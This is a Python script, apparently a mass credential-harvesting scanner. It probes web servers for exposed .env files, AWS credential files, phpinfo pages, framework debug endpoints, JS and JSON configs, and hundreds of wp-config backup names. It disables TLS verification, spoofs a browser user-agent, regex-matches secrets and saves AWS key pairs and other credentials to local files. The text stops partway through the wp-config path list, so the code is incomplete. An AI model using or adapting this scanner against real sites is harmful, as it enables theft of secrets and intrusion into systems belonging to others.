import multiprocessing as mp
import re
import ast
import os
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import json
from functools import partial
import curses
import time

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    regConfig = ast.literal_eval(open('settings.json').read())
except FileNotFoundError:
    print('File settings.json not found')
    sys.exit()

session = requests.Session()
session.headers.update(
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'})


class Parse:

    def __init__(self, text, url, method):
        self.text = text
        self.url = url
        self.method = method

    def parse(self, foldersave):
        matches = {}
        for key, value in regConfig.items():
            found = re.findall(value[1], self.text)
            if found:
                matches[key] = found

        if 'AWS_ACCESS_KEY' in matches and 'AWS_SECRET_KEY' in matches:
            with open(foldersave + '/' + self.method + 'aws_keys.txt', 'a') as f:
                for access_key, secret_key in zip(matches['AWS_ACCESS_KEY'], matches['AWS_SECRET_KEY']):
                    f.write(f'{access_key}:{secret_key}\n')
                f.close()
        else:
            for key, found in matches.items():
                with open(foldersave + '/' + self.method + key, 'a') as f:
                    f.write(self.url + ' -> FOUND ' + regConfig[key][0] + '\n')
                    for match in found:
                        f.write('  ' + match + '\n')
                    f.close()

def is_json(myjson):
    try:
        json.loads(myjson)
        return True
    except:
        return False


class Main:
    def __init__(self, url, folder):
        self.url = url
        self.folder = folder

    def saveTofile(self, filename, text, url, method=''):
        with open(self.folder + '/' + filename, 'a') as f:
            f.write(url + '\n')
        Parse(text, url, method).parse(self.folder)

    def rebuild_url(self, path):
        if self.url[-1] == '/':
            return self.url + path
        else:
            return self.url + '/' + path

    def debug(self):
        method = 'debug_'
        url_ = self.url
        try:
            resp = session.post(
                url_, data={1: 1}, timeout=10, verify=False).text
            if 'APP_KEY' in resp:
                print(self.url + ' -> FOUND LARAVEL DEBUG')
                self.saveTofile('laravel_debug.txt', resp, url_, method)
            else:
                print(self.url + ' -> NOT FOUND LARAVEL DEBUG')
        except:
            pass

    def env(self):
        list_env = ['.env.bak', '.env', 'config.env', '.env.dist', '.env.dev', '.env.local', 'public/.env', 'laravel/.env', 'laravel/core/.env', 'beta/.env', 'kyc/.env', 'admin/.env', 'prod/.env', '.env.backup', '.env.docker.dev', '.env.php', '.env.prod', '.env.production.local', '.env.sample.php', '.env.save', '.env.stage', '.env.test', '.env.test.local', '.env.local', '.env.production', '.env.staging', 'backup/.env', 'backup/.env.local', 'backup/.env.production', 'backup/.env.staging', 'public/.env', 'public/.env.local', 'public/.env.production', 'public/.env.staging', 'laravel/.env', 'laravel/.env.local', 'laravel/.env.production', 'laravel/.env.staging', 'laravel/core/.env', 'laravel/core/.env.local', 'laravel/core/.env.production', 'laravel/core/.env.staging', 'beta/.env', 'beta/.env.local', 'beta/.env.production', 'beta/.env.staging',  'live/.env', 'live/.env.local', 'live/.env.production', 'live/.env.staging', 'demo/.env', 'demo/.env.local', 'demo/.env.production', 'demo/.env.staging', 'test/.env', 'test/.env.local', 'test/.env.production', 'test/.env.staging', 'kyc/.env',  'kyc/.env.local', 'kyc/.env.production', 'kyc/.env.staging',  'admin/.env', 'admin/.env.local',  'admin/.env.production',  'admin/.env.staging',  'client/.env', 'client/.env.local', 'client/.env.production', 'client/.env.staging', 'user/.env', 'user/.env.local', 'user/.env.staging', 'api/.env',  'api/.env.local', 'api/.env.staging', 'api/.env.production', 'apis/.env', 'apis/.env.local', 'apis/.env.staging', 'apis/.env.production', 'backend/.env', 'backend/.env.local', 'backend/.env.staging', 'backend/.env.production', 'server/.env', 'server/.env.local', 'server/.env.staging', 'server/.env.production', 'app/.env', 'app/.env.local', 'app/.env.staging', 'app/.env.production', 'project/.env', 'project/.env.local', 'project/.env.staging', 'project/.env.production', 'cron/.env', 'cron/.env.local', 'cron/.env.staging', 'cron/.env.production', 'crm/.env', 'crm/.env.local', 'crm/.env.staging', 'crm/.env.production', 'current/.env', 'current/.env.local', 'current/.env.staging', 'current/.env.production', 'dev/.env', 'dev/.env.local', 'dev/.env.staging', 'dev/.env.production', 'develop/.env', 'develop/.env.local', 'develop/.env.staging', 'develop/.env.production', 'development/.env', 'development/.env.local', 'development/.env.staging', 'development/.env.production', 'prod/.env',  'prod/.env.local', 'prod/.env.staging', 'prod/.env.production', 'product/.env', 'product/.env.local', 'product/.env.staging', 'product/.env.production', 'production/.env', 'production/.env.local', 'production/.env.staging', 'production/.env.production', 'portal/.env', 'portal/.env.local', 'portal/.env.staging', 'portal/.env.production', 'qa/.env', 'qa/.env.local', 'qa/.env.staging', 'qa/.env.production', 'stg/.env', 'stg/.env.local', 'stg/.env.staging', 'stg/.env.production', 'staging/.env', 'staging/.env.local', 'staging/.env.staging', 'staging/.env.production', 'service/.env', 'service/.env.local', 'service/.env.staging', 'service/.env.production', 'services/.env', 'services/.env.local', 'services/.env.staging', 'services/.env.production', 'storage/.env', 'storage/.env.local', 'storage/.env.staging', 'storage/.env.production', 'old/.env', 'old/.env.local', 'old/.env.staging', 'old/.env.production', 'new/.env', 'new/.env.local', 'new/.env.staging', 'new/.env.production', 'web/.env', 'web/.env.local', 'web/.env.staging', 'web/.env.production', 'website/.env', 'website/.env.local', 'website/.env.staging', 'website/.env.production', 'market/.env', 'market/.env.local', 'market/.env.staging', 'market/.env.production', 'marketing/.env', 'marketing/.env.local', 'marketing/.env.staging', 'marketing/.env.production', 'shop/.env', 'shop/.env.local', 'shop/.env.staging', 'shop/.env.production', 'public_html/.env', 'public_html/.env.local', 'public_html/.env.staging', 'public_html/.env.production', 'xampp/.env', 'xampp/.env.local', 'xampp/.env.staging', 'xampp/.env.production',
                    'api/.env', '.docker/.env',  '.docker/laravel/app/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', '.gitlab-ci/.env', '.vscode/.env', 'mailer/.env', 'twitter/.env', '.env.development.local', '.env', '.env.local', '.env.production', '.env.staging', 'backup/.env', 'public/.env', 'laravel/.env',  'config.env', 'config/.env', 'beta/.env',  'live/.env', 'lms/.env', 'demo/.env', 'test/.env', 'kyc/.env',  'admin/.env',  'client/.env', 'user/.env', 'usr/.env', 'api/.env', 'apis/.env', 'back/.env', 'backend/.env', 'front/.env', 'frontend/.env', 'server/.env', 'app/.env', 'apps/.env', 'application/.env', 'project/.env', 'cron/.env', 'current/.env', 'dev/.env', 'develop/.env', 'development/.env', 'prod/.env',  'product/.env', 'production/.env', 'portal/.env', 'stg/.env', 'staging/.env', 'service/.env', 'services/.env', 'storage/.env', 'old/.env', 'new/.env', 'web/.env', 'website/.env', 'market/.env', 'marketing/.env', 'media/.env', 'node/.env', 'nodeapi/.env', 'nodeweb/.env', 'shop/.env', 'public_html/.env', 'xampp/.env', 'API/.env', 'APP/.env', 'BACK/.env', 'BACKEND/.env', 'FRONT/.env', 'FRONTEND/.env', 'properties.ini', 'settings.py' ]
        for path in list_env:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if 'APP_KEY' in resp:
                    print(self.url + ' -> FOUND LARAVEL ENV')
                    self.saveTofile('laravel_env.txt', resp, url_)
                    break
                else:
                    if path == list_env[-1]:
                        print(self.url + ' -> NOT FOUND LARAVEL ENV')
            except:
                pass

    def symfony(self):
        url_ = self.rebuild_url('frontend_dev.php/$')
        try:
            resp = session.get(url_, timeout=10, verify=False).text
            if 'sf_app' in resp:
                print(self.url + ' -> FOUND SYMFONY DEBUG')
                self.saveTofile('symfony_debug.txt', resp, url_)
            else:
                print(self.url + ' -> NOT FOUND SYMFONY DEBUG')
        except:
            pass

    def aws(self):
        configAws = ['.aws/credentials', '.s3cfg', '.msmtprc']
        for path in configAws:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False, allow_redirects=False).text
                if 'AKIA' in resp or re.search('aws_access_key_id', resp, re.IGNORECASE):
                    print(self.url + ' -> FOUND AWS')
                    self.saveTofile('aws_credentials.txt', resp, url_)
                    break
                else:
                    if path == configAws[-1]:
                        print(self.url + ' -> NOT FOUND AWS')
            except:
                pass

    def yii(self):
        url_ = self.rebuild_url('debug/default/view?panel=config')
        try:
            resp = session.get(url_, timeout=10, verify=False).text
            if 'Yii Debugger' in resp:
                print(self.url + ' -> FOUND YII DEBUGGER')
                self.saveTofile('yii_debug.txt', resp, url_)
            else:
                print(self.url + ' -> NOT FOUND YII DEBUGGER')
        except:
            pass

    def phpinfo(self):
        phpinfoPathlist = ['xampp/info.php', 'xampp/phpinfo', '_profiler/phpinfo', 'phpinfo.php', 'phpinfo', 'info.php', 'php.ini', 'php.php', 'infophp.php', 'test.php', 'dashboard/phpinfo.php', '/api/phpinfo.php', '/backend/phpinfo.php', '/backup/phpinfo.php', '/crm/phpinfo.php', '/current/phpinfo.php', '/dev/phpinfo.php', '/develop/phpinfo.php', '/development/phpinfo.php', '/help/phpinfo.php', '/helper/phpinfo.php', '/lara/phpinfo.php', '/laravel/phpinfo.php', '/server/phpinfo.php', '/service/phpinfo.php', '/services/phpinfo.php', '/xampp/phpinfo.php', '/phpinfo', '/info.php', '/api/info.php', '/backend/info.php', '/backup/info.php', '/crm/info.php', '/current/info.php', '/dev/info.php', '/develop/info.php', '/development/iinfo.php', '/help/info.php', '/helper/info.php', '/lara/info.php', '/laravel/info.php', '/server/info.php', '/service/info.php', '/services/info.php', '/xampp/info.php',
                        'php-info.php', 'linusadmin-phpinfo.php', 'infos.php', 'old_phpinfo.php', 'temp.php', 'time.php', 'phpversion.php', 'pinfo.php', 'i.php', 'asdf.php']
        for path in phpinfoPathlist:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if 'PHP Variables' in resp and 'Environment' in resp:
                    print(self.url + ' -> FOUND PHPINFO')
                    self.saveTofile('phpinfo.txt', resp, url_)
                    break
                else:
                    if path == phpinfoPathlist[-1]:
                        print(self.url + ' -> NOT FOUND PHPINFO')
            except:
                pass

    def config_json(self):
        configjsonPathlist = ['index.json', 'config.json', 'config/config.json', 'info.json', '.config/gatsby/config.json', '.cordova/config.json', '.deployment-config.json', '.docker/config.json', '.docker/daemon.json',
                            '.jupyter/jupyter_notebook_config.json', '.lanproxy/config.json', '_wpeprivate/config.json', 'console/base/config.json', 'console/payments/config.json', 'server/config.json']
        for path in configjsonPathlist:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if is_json(resp):
                    print(self.url + ' -> FOUND JSON CONFIG')
                    self.saveTofile('json_config.txt', resp, url_)
                    break
                else:
                    if path == configjsonPathlist[-1]:
                        print(self.url + ' -> NOT FOUND JSON CONFIG')
            except:
                pass

    def config_js(self):
        configjsPathlist = ['index.js', 'config.js', 'config/config.js', 'app.js', 'config.js', 'constant.js', 'constants.js', 'controller.js', 'helper.js', 'index.js', 'mail.js', 'mailer.js', 'mailserver.js', 'server.js', 'utils.js', 'admin/app.js', 'admin/constant.js', 'admin/constants.js', 'admin/controller.js', 'admin/helper.js', 'admin/index.js', 'admin/mail.js', 'admin/mailer.js', 'admin/mailserver.js', 'admin/server.js', 'admin/utils.js', 'admin/config/common.js', 'admin/config/constants.js', 'admin/config/database.js', 'admin/config/template.js', 'api/app.js', 'api/config.js', 'api/constant.js', 'api/constants.js', 'api/controller.js', 'api/helper.js', 'api/index.js', 'api/mail.js', 'api/mailer.js', 'api/mailserver.js', 'api/server.js', 'api/utils.js', 'api/controller.js', 'api/config/common.js', 'api/config/constants.js', 'api/config/database.js', 'api/config/template.js', 'backend/app.js', 'backend/config.js', 'backend/constant.js', 'backend/constants.js', 'backend/controller.js', 'backend/helper.js', 'backend/index.js', 'backend/mail.js', 'backend/mailer.js', 'backend/mailserver.js', 'backend/server.js', 'backend/utils.js', 'backend/config/common.js', 'backend/config/constants.js', 'backend/config/database.js', 'backend/config/template.js', 'config/app.js', 'config/config.js', 'config/constant.js', 'config/constants.js', 'config/controller.js', 'config/helper.js', 'config/index.js', 'config/mail.js', 'config/mailer.js', 'config/mailserver.js', 'config/server.js', 'config/utils.js', 'config/common.js', 'config/database.js', 'config/template.js', 'dev/app.js', 'dev/config.js', 'dev/constant.js', 'dev/constants.js', 'dev/controller.js', 'dev/helper.js', 'dev/index.js', 'dev/mail.js', 'dev/mailer.js', 'dev/mailserver.js', 'dev/server.js', 'dev/utils.js', 'dev/config/common.js', 'dev/config/constants.js', 'dev/config/database.js', 'dev/config/template.js', 'src/app.js', 'src/src.js', 'src/constant.js', 'src/constants.js', 'src/controller.js', 'src/helper.js', 'src/index.js', 'src/mail.js', 'src/mailer.js', 'src/mailserver.js', 'src/server.js', 'src/utils.js', 'src/config/common.js', 'src/config/constants.js', 'src/config/database.js', 'src/config/template.js', 'server/app.js', 'server/server.js', 'server/constant.js', 'server/constants.js', 'server/controller.js', 'server/helper.js', 'server/index.js', 'server/mail.js', 'server/mailer.js', 'server/mailserver.js', 'server/server.js', 'server/utils.js', 'server/config/common.js', 'server/config/constants.js', 'server/config/database.js', 'server/config/template.js', 'web/app.js', 'web/web.js', 'web/constant.js', 'web/constants.js', 'web/controller.js', 'web/helper.js', 'web/index.js', 'web/mail.js', 'web/mailer.js', 'web/mailserver.js', 'web/server.js', 'web/utils.js', 'web/config/common.js', 'web/config/constants.js', 'web/config/database.js', 'web/config/template.js', 'api/common.js', 'api/config/common.js', 'API/common.js', 'API/config/common.js', 'server/helper/aws_s3.js'
                            'js/config.js', 'js/envConfig.js', 'env.config.js', 'env.js', 'config/settings.py', 'properties.ini', '/rista/properties.ini']
        for path in configjsPathlist:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False)
                if 'javascript' in str(resp.headers):
                    print(self.url + ' -> FOUND JS CONFIG')
                    self.saveTofile('js_config.txt', resp.text, url_)
                    break
                else:
                    if path == configjsPathlist[-1]:
                        print(self.url + ' -> NOT FOUND JS CONFIG')
            except:
                pass

    def config_php(self):
        configphpPathlist = ['wp-config.php.bak', 'wp-config.php.old', 'wp-config.php-backup', '.wp-config.php.swo', 'wp-config.php.swp', '.wp-config.swp', '#wp-config.php#', 'backup.wp-config.php', 'wp-config', 'wp-config - Copy.php', 'wp-config copy.php', 'wp-config_backup', 'wp-config_good', 'wp-config-backup', 'wp-config-backup.php', 'wp-config-backup.txt', 'wp-config-backup1.txt', 'wp-config-good', 'wp-config-sample.php', 'wp-config-sample.php.bak', 'wp-config-sample.php~', 'wp-config.backup', 'wp-config.bak', 'wp-config.bkp', 'wp-config.cfg', 'wp-config.conf', 'wp-config.data', 'wp-config.dump', 'wp-config.good', 'wp-config.htm', 'wp-config.html', 'wp-config.inc', 'wp-config.local.php', 'wp-config.old', 'wp-config.old.old', 'wp-config.ORG', 'wp-config.orig', 'wp-config.original', 'wp-config.php', 'wp-config.php_', 'wp-config.php__', 'wp-config.php______', 'wp-config.php__olds', 'wp-config.php_1', 'wp-config.php_backup', 'wp-config.php_bak', 'wp-config.php_bk', 'wp-config.php_new', 'wp-config.php_old', 'wp-config.php_old2017', 'wp-config.php_old2018', 'wp-config.php_old2019', 'wp-config.php_old2020', 'wp-config.php_orig', 'wp-config.php_original', 'wp-config.php-', 'wp-config.php-backup', 'wp-config.php-bak', 'wp-config.php-n', 'wp-config.php-o', 'wp-config.php-old', 'wp-config.php-original', 'wp-config.php-save', 'wp-config.php-work', 'wp-config.php.0', 'wp-config.php.1', 'wp-config.php.2', 'wp-config.php.3', 'wp-config.php.4', 'wp-config.php.5', 'wp-config.php.6', 'wp-config.php.7', 'wp-config.php.8', 'wp-config.php.9', 'wp-config.php.a', 'wp-config.php.aws', 'wp-config.php.azure', 'wp-config.php.b', 'wp-config.php.backup', 'wp-config.php.backup.txt', 'wp-config.php.bak', 'wp-config.php.bak1', 'wp-config.php.bk', 'wp-config.php.bkp', 'wp-config.php.c', 'wp-config.php.com', 'wp-config.php.cust', 'wp-config.php.dev', 'wp-config.php.disabled', 'wp-config.php.dist', 'wp-config.php.dump', 'wp-config.php.html', 'wp-config.php.in', 'wp-config.php.inc', 'wp-config.php.local', 'wp-config.php.maj', 'wp-config.php.new', 'wp-config.php.old', 'wp-config.php.org', 'wp-config.php.orig', 'wp-config.php.original', 'wp-config.php.php-bak', 'wp-config.php.prod', 'wp-config.php.production', 'wp-config.php.sample', 'wp-config.php.save', 'wp-config.php.save.1', 'wp-config.php.stage', 'wp-config.php.staging', 'wp-config.php.swn', 'wp-config.php.swo', 'wp-config.php.swp', 'wp-config.php.tar', 'wp-config.php.temp', 'wp-config.php.tmp', 'wp-config.php.txt', 'wp-config.php.uk', 'wp-config.php.us', 'wp-config.php=', 'wp-config.php~', 'wp-config.php~~~', 'wp-config.php1', 'wp-config.phpa', 'wp-config.phpb', 'wp-config.phpbak', 'wp-config.phpc', 'wp-config.phpd', 'wp-config.phpn', 'wp-config.phpnew', 'wp-config.phpold', 'wp-config.phporiginal', 'wp-config.phptmp', 'wp-config.prod.php.txt', 'wp-config.save', 'wp-config.tar', 'wp-config.temp', 'wp-config.txt', 'wp-config.zip', 'wp-config~', 'wp-configbak', 'admin/wp-config.php.bak', 'admin/wp-config.php.old', 'admin/wp-config.php-backup', '.admin/wp-config.php.swo', 'admin/wp-config.php.sadmin/wp', '.admin/wp-config.sadmin/wp', '#admin/wp-config.php#', 'backup.admin/wp-config.php', 'admin/wp-config', 'admin/wp-config - Copy.php', 'admin/wp-config copy.php', 'admin/wp-config_backup', 'admin/wp-config_good', 'admin/wp-config-backup', 'admin/wp-config-backup.php', 'admin/wp-config-backup.txt', 'admin/wp-config-backup1.txt', 'admin/wp-config-good', 'admin/wp-config-sample.php', 'admin/wp-config-sample.php.bak', 'admin/wp-config-sample.php~', 'admin/wp-config.backup', 'admin/wp-config.bak', 'admin/wp-config.bkp', 'admin/wp-config.cfg', 'admin/wp-config.conf', 'admin/wp-config.data', 'admin/wp-config.dump', 'admin/wp-config.good', 'admin/wp-config.htm', 'admin/wp-config.html', 'admin/wp-config.inc', 'admin/wp-config.local.php', 'admin/wp-config.old', 'admin/wp-config.old.old', 'admin/wp-config.ORG', 'admin/wp-config.orig', 'admin/wp-config.original', 'admin/wp-config.php', 'admin/wp-config.php_', 'admin/wp-config.php__', 'admin/wp-config.php______', 'admin/wp-config.php__olds', 'admin/wp-config.php_1', 'admin/wp-config.php_backup', 'admin/wp-config.php_bak', 'admin/wp-config.php_bk', 'admin/wp-config.php_new', 'admin/wp-config.php_old', 'admin/wp-config.php_old2017', 'admin/wp-config.php_old2018', 'admin/wp-config.php_old2019', 'admin/wp-config.php_old2020', 'admin/wp-config.php_orig', 'admin/wp-config.php_original', 'admin/wp-config.php-', 'admin/wp-config.php-backup', 'admin/wp-config.php-bak', 'admin/wp-config.php-n', 'admin/wp-config.php-o', 'admin/wp-config.php-old', 'admin/wp-config.php-original', 'admin/wp-config.php-save', 'admin/wp-config.php-work', 'admin/wp-config.php.0', 'admin/wp-config.php.1', 'admin/wp-config.php.2', 'admin/wp-config.php.3', 'admin/wp-config.php.4', 'admin/wp-config.php.5', 'admin/wp-config.php.6', 'admin/wp-config.php.7', 'admin/wp-config.php.8', 'admin/wp-config.php.9', 'admin/wp-config.php.a', 'admin/wp-config.php.aws', 'admin/wp-config.php.azure', 'admin/wp-config.php.b', 'admin/wp-config.php.backup', 'admin/wp-config.php.backup.txt', 'admin/wp-config.php.bak', 'admin/wp-config.php.bak1', 'admin/wp-config.php.bk', 'admin/wp-config.php.bkp', 'admin/wp-config.php.c', 'admin/wp-config.php.com', 'admin/wp-config.php.cust', 'admin/wp-config.php.dev', 'admin/wp-config.php.disabled', 'admin/wp-config.php.dist', 'admin/wp-config.php.dump', 'admin/wp-config.php.html', 'admin/wp-config.php.in', 'admin/wp-config.php.inc', 'admin/wp-config.php.local', 'admin/wp-config.php.maj', 'admin/wp-config.php.new', 'admin/wp-config.php.old', 'admin/wp-config.php.org', 'admin/wp-config.php.orig', 'admin/wp-config.php.original', 'admin/wp-config.php.php-bak', 'admin/wp-config.php.prod', 'admin/wp-config.php.production', 'admin/wp-config.php.sample', 'admin/wp-config.php.save', 'admin/wp-config.php.save.1', 'admin/wp-config.php.stage', 'admin/wp-config.php.staging', 'admin/wp-config.php.swn', 'admin/wp-config.php.swo', 'admin/wp-config.php.sadmin/wp', 'admin/wp-config.php.tar', 'admin/wp-config.php.temp', 'admin/wp-config.php.tmp', 'admin/wp-config.php.txt', 'admin/wp-config.php.uk', 'admin/wp-config.php.us', 'admin/wp-config.php=', 'admin/wp-config.php~', 'admin/wp-config.php~~~', 'admin/wp-config.php1', 'admin/wp-config.phpa', 'admin/wp-config.phpb', 'admin/wp-config.phpbak', 'admin/wp-config.phpc', 'admin/wp-config.phpd', 'admin/wp-config.phpn', 'admin/wp-config.phpnew', 'admin/wp-config.phpold', 'admin/wp-config.phporiginal', 'admin/wp-config.phptmp', 'admin/wp-config.prod.php.txt', 'admin/wp-config.save', 'admin/wp-config.tar', 'admin/wp-config.temp', 'admin/wp-config.txt', 'admin/wp-config.zip', 'admin/wp-config~', 'admin/wp-configbak', 'wp-config.php.sav', 'wp-config.php.copy', 'wp-config.php.tmp', 'wp-config.php.txt', 'wp-config.php.back', 'wp-config.php.zip', 'wp-config.php.test', 'wp-config.php.tgz', 'wp-config.php.temp', 'wp-config.php.tar.gz', 'wp-config.php.bakup', 'wp-config.php.war', 'wp-config.php.tar', 'wp-config.php.saved', 'wp-config.php.sav', 'wp-config.php.pas', 'wp-config.php.ini', 'wp-config.php.jar', 'wp-config.php.default', 'wp-config.php.db', 'wp-config.php.dat', 'wp-config.php.core', 'wp-config.php.conf',
        'wp/wp-config.php.bak', 'wp/wp-config.php.old', 'wp/wp-config.php-backup', '.wp/wp-config.php.swo', 'wp/wp-config.php.swp/wp', '.wp/wp-config.swp/wp', '#wp/wp-config.php#', 'backup.wp/wp-config.php', 'wp/wp-config', 'wp/wp-config - Copy.php', 'wp/wp-config copy.php', 'wp/wp-config_backup', 'wp/wp-config_good', 'wp/wp-config-backup', 'wp/wp-config-backup.php', 'wp/wp-config-backup.txt', 'wp/wp-config-backup1.txt', 'wp/wp-config-good', 'wp/wp-config-sample.php', 'wp/wp-config-sample.php.bak', 'wp/wp-config-sample.php~', 'wp/wp-config.backup', 'wp/wp-config.bak', 'wp/wp-config.bkp', 'wp/wp-config.cfg', 'wp/wp-config.conf', 'wp/wp-config.data', 'wp/wp-config.dump', 'wp/wp-config.good', 'wp/wp-config.htm', 'wp/wp-config.html', 'wp/wp-config.inc', 'wp/wp-config.local.php', 'wp/wp-config.old', 'wp/wp-config.old.old', 'wp/wp-config.ORG', 'wp/wp-config.orig', 'wp/wp-config.original', 'wp/wp-config.php', 'wp/wp-config.php_', 'wp/wp-config.php__', 'wp/wp-config.php______', 'wp/wp-config.php__olds', 'wp/wp-config.php_1', 'wp/wp-config.php_backup', 'wp/wp-config.php_bak', 'wp/wp-config.php_bk', 'wp/wp-config.php_new', 'wp/wp-config.php_old', 'wp/wp-config.php_old2017', 'wp/wp-config.php_old2018', 'wp/wp-config.php_old2019', 'wp/wp-config.php_old2020', 'wp/wp-config.php_orig', 'wp/wp-config.php_original', 'wp/wp-config.php-', 'wp/wp-config.php-backup', 'wp/wp-config.php-bak', 'wp/wp-config.php-n', 'wp/wp-config.php-o', 'wp/wp-config.php-old', 'wp/wp-config.php-original', 'wp/wp-config.php-save', 'wp/wp-config.php-work', 'wp/wp-config.php.0', 'wp/wp-config.php.1', 'wp/wp-config.php.2', 'wp/wp-config.php.3', 'wp/wp-config.php.4', 'wp/wp-config.php.5', 'wp/wp-config.php.6', 'wp/wp-config.php.7', 'wp/wp-config.php.8', 'wp/wp-config.php.9', 'wp/wp-config.php.a', 'wp/wp-config.php.aws', 'wp/wp-config.php.azure', 'wp/wp-config.php.b', 'wp/wp-config.php.backup', 'wp/wp-config.php.backup.txt', 'wp/wp-config.php.bak', 'wp/wp-config.php.bak1', 'wp/wp-config.php.bk', 'wp/wp-config.php.bkp', 'wp/wp-config.php.c', 'wp/wp-config.php.com', 'wp/wp-config.php.cust', 'wp/wp-config.php.dev', 'wp/wp-config.php.disabled', 'wp/wp-config.php.dist', 'wp/wp-config.php.dump', 'wp/wp-config.php.html', 'wp/wp-config.php.in', 'wp/wp-config.php.inc', 'wp/wp-config.php.local', 'wp/wp-config.php.maj', 'wp/wp-config.php.new', 'wp/wp-config.php.old', 'wp/wp-config.php.org', 'wp/wp-config.php.orig', 'wp/wp-config.php.original', 'wp/wp-config.php.php-bak', 'wp/wp-config.php.prod', 'wp/wp-config.php.production', 'wp/wp-config.php.sample', 'wp/wp-config.php.save', 'wp/wp-config.php.save.1', 'wp/wp-config.php.stage', 'wp/wp-config.php.staging', 'wp/wp-config.php.swn', 'wp/wp-config.php.swo', 'wp/wp-config.php.swp/wp', 'wp/wp-config.php.tar', 'wp/wp-config.php.temp', 'wp/wp-config.php.tmp', 'wp/wp-config.php.txt', 'wp/wp-config.php.uk', 'wp/wp-config.php.us', 'wp/wp-config.php=', 'wp/wp-config.php~', 'wp/wp-config.php~~~', 'wp/wp-config.php1', 'wp/wp-config.phpa', 'wp/wp-config.phpb', 'wp/wp-config.phpbak', 'wp/wp-config.phpc', 'wp/wp-config.phpd', 'wp/wp-config.phpn', 'wp/wp-config.phpnew', 'wp/wp-config.phpold', 'wp/wp-config.phporiginal', 'wp/wp-config.phptmp', 'wp/wp-config.prod.php.txt', 'wp/wp-config.save', 'wp/wp-config.tar', 'wp/wp-config.temp', 'wp/wp-config.txt', 'wp/wp-config.zip', 'wp/wp-config~', 'wp/wp-configbak', 'wordpress/wp-config.php.bak', 'wordpress/wp-config.php.old', 'wordpress/wp-config.php-backup', '.wordpress/wp-config.php.swo', 'wordpress/wp-config.php.swordpress/wp', '.wordpress/wp-config.swordpress/wp', '#wordpress/wp-config.php#', 'backup.wordpress/wp-config.php', 'wordpress/wp-config', 'wordpress/wp-config - Copy.php', 'wordpress/wp-config copy.php', 'wordpress/wp-config_backup', 'wordpress/wp-config_good', 'wordpress/wp-config-backup', 'wordpress/wp-config-backup.php', 'wordpress/wp-config-backup.txt', 'wordpress/wp-config-backup1.txt', 'wordpress/wp-config-good', 'wordpress/wp-config-sample.php', 'wordpress/wp-config-sample.php.bak', 'wordpress/wp-config-sample.php~', 'wordpress/wp-config.backup', 'wordpress/wp-config.bak', 'wordpress/wp-config.bkp', 'wordpress/wp-config.cfg', 'wordpress/wp-config.conf', 'wordpress/wp-config.data', 'wordpress/wp-config.dump', 'wordpress/wp-config.good', 'wordpress/wp-config.htm', 'wordpress/wp-config.html', 'wordpress/wp-config.inc', 'wordpress/wp-config.local.php', 'wordpress/wp-config.old', 'wordpress/wp-config.old.old', 'wordpress/wp-config.ORG', 'wordpress/wp-config.orig', 'wordpress/wp-config.original', 'wordpress/wp-config.php', 'wordpress/wp-config.php_', 'wordpress/wp-config.php__', 'wordpress/wp-config.php______', 'wordpress/wp-config.php__olds', 'wordpress/wp-config.php_1', 'wordpress/wp-config.php_backup', 'wordpress/wp-config.php_bak', 'wordpress/wp-config.php_bk', 'wordpress/wp-config.php_new', 'wordpress/wp-config.php_old', 'wordpress/wp-config.php_old2017', 'wordpress/wp-config.php_old2018', 'wordpress/wp-config.php_old2019', 'wordpress/wp-config.php_old2020', 'wordpress/wp-config.php_orig', 'wordpress/wp-config.php_original', 'wordpress/wp-config.php-', 'wordpress/wp-config.php-backup', 'wordpress/wp-config.php-bak', 'wordpress/wp-config.php-n', 'wordpress/wp-config.php-o', 'wordpress/wp-config.php-old', 'wordpress/wp-config.php-original', 'wordpress/wp-config.php-save', 'wordpress/wp-config.php-work', 'wordpress/wp-config.php.0', 'wordpress/wp-config.php.1', 'wordpress/wp-config.php.2', 'wordpress/wp-config.php.3', 'wordpress/wp-config.php.4', 'wordpress/wp-config.php.5', 'wordpress/wp-config.php.6', 'wordpress/wp-config.php.7', 'wordpress/wp-config.php.8', 'wordpress/wp-config.php.9', 'wordpress/wp-config.php.a', 'wordpress/wp-config.php.aws', 'wordpress/wp-config.php.azure', 'wordpress/wp-config.php.b', 'wordpress/wp-config.php.backup', 'wordpress/wp-config.php.backup.txt', 'wordpress/wp-config.php.bak', 'wordpress/wp-config.php.bak1', 'wordpress/wp-config.php.bk', 'wordpress/wp-config.php.bkp', 'wordpress/wp-config.php.c', 'wordpress/wp-config.php.com', 'wordpress/wp-config.php.cust', 'wordpress/wp-config.php.dev', 'wordpress/wp-config.php.disabled', 'wordpress/wp-config.php.dist', 'wordpress/wp-config.php.dump', 'wordpress/wp-config.php.html', 'wordpress/wp-config.php.in', 'wordpress/wp-config.php.inc', 'wordpress/wp-config.php.local', 'wordpress/wp-config.php.maj', 'wordpress/wp-config.php.new', 'wordpress/wp-config.php.old', 'wordpress/wp-config.php.org', 'wordpress/wp-config.php.orig', 'wordpress/wp-config.php.original', 'wordpress/wp-config.php.php-bak', 'wordpress/wp-config.php.prod', 'wordpress/wp-config.php.production', 'wordpress/wp-config.php.sample', 'wordpress/wp-config.php.save', 'wordpress/wp-config.php.save.1', 'wordpress/wp-config.php.stage', 'wordpress/wp-config.php.staging', 'wordpress/wp-config.php.swn', 'wordpress/wp-config.php.swo', 'wordpress/wp-config.php.swordpress/wp', 'wordpress/wp-config.php.tar', 'wordpress/wp-config.php.temp', 'wordpress/wp-config.php.tmp', 'wordpress/wp-config.php.txt', 'wordpress/wp-config.php.uk', 'wordpress/wp-config.php.us', 'wordpress/wp-config.php=', 'wordpress/wp-config.php~', 'wordpress/wp-config.php~~~', 'wordpress/wp-config.php1', 'wordpress/wp-config.phpa', 'wordpress/wp-config.phpb', 'wordpress/wp-config.phpbak', 'wordpress/wp-config.phpc', 'wordpress/wp-config.phpd', 'wordpress/wp-config.phpn', 